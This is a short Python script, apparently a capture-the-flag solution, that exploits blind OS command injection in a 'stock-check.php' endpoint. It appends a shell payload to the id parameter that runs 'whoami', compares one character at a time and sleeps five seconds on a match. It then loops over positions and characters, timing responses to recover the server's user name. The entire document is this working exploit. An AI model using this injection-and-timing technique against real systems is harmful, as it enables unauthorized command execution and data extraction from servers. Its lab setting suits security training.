import requests
import string
import time

# Define the base URL without the variables
base_url = "https://suanht3t.eu2.ctfio.com/stock-check.php?id=f3d1426d-16af-4243-a148-d7c874ddfe1a;if+[+$(whoami+|+cut+-c+{var1})+%3d+'{var2}'+]%3bthen+sleep+5+%3b+fi"

# Create the lists of possible values for var1 and var2
var1_values = list(range(1, 10))  # Numbers from 1 to 9
var2_values = list(string.ascii_lowercase) + ['-', '1', '2', '3', '4', '5']  # Letters a-z, '-', and numbers 1-5

# Loop through all combinations of var1 and var2
for var1 in var1_values:
    for var2 in var2_values:
        # Format the URL with the current var1 and var2 values
        url = base_url.format(var1=var1, var2=var2)
        
        try:
            # Send the GET request and measure the response time
            start_time = time.time()  # Record the start time
            response = requests.get(url, timeout=10)  # Timeout after 10 seconds to ensure safety
            elapsed_time = time.time() - start_time  # Calculate elapsed time

            # Check if the delay is more than 5 seconds
            if elapsed_time > 5:
                # print(f"Delay detected with var1={var1}, var2={var2}. Delay: {elapsed_time:.2f} seconds")
                print(var2)
            else:
                # Continue if no significant delay
                continue

        except requests.exceptions.Timeout:
            # Handle timeouts that exceed the maximum allowed time (if it takes more than 10 seconds)
            print(f"Request with var1={var1}, var2={var2} exceeded maximum timeout.")

        except requests.exceptions.RequestException as e:
            # Handle other request-related exceptions
            print(f"Request failed with var1={var1}, var2={var2}. Error: {e}")
